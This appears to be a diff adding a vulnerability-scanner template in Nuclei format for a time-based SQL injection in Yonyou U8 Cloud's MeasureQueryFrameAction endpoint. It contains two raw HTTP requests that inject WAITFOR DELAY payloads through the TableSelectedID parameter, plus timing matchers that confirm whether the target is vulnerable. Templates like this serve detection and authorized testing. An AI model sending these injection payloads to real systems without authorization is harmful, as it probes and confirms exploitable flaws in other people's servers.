@@ -1,0 +1,28 @@
+id: yongyouU8-Cloud-MeasureQueryFrameAction-sql
+
+info:
+  name: 用友U8 Cloud MeasureQueryFrameAction SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
